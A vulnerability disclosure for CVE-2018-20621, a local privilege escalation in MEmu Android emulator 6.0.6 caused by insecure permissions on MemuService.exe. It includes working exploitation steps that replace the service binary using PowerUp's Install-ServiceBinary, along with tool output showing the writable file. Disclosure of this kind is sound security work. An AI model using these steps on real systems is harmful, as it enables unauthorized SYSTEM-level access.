# CVE-2018-20621: MEmu Android Emulator Local Privilege Escalation

<!---
Remember to end each line under the "Information" header with 2 space characters ("  ") to tell Markdown to break the line.
--->
## Information
**Description:** The MemuService.exe service binary is vulnerable to local privilege escalation.    
**Versions Affected:** 6.0.6  
**Researcher:** David Yesland (https://twitter.com/daveysec @daveysec)  
**Disclosure Link:** NA  
**NIST CVE Link:** https://nvd.nist.gov/vuln/detail/CVE-2018-20621  

## Proof-of-Concept Exploit
### Description
The MemuService.exe service binary is vulnerable to local privilege escalation through binary planting due to insecure permissions set at install time. This allows code to be run as NT AUTHORITY/SYSTEM.


### Usage/Exploitation
Rename `C:\Program Files\Microvirt\MEmu\MemuService.exe` to `MemuService.exe.old`. Then using PowerShellEmpire PowerUp run `Install-ServiceBinary -Name 'MEmuSVC'`. Reboot.  

### Detail
```
ServiceName                     : MEmuSVC
Path                            : C:\Program Files\Microvirt\MEmu\MemuService.exe
ModifiableFile                  : C:\Program Files\Microvirt\MEmu\MemuService.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'MEmuSVC'
CanRestart                      : False
```
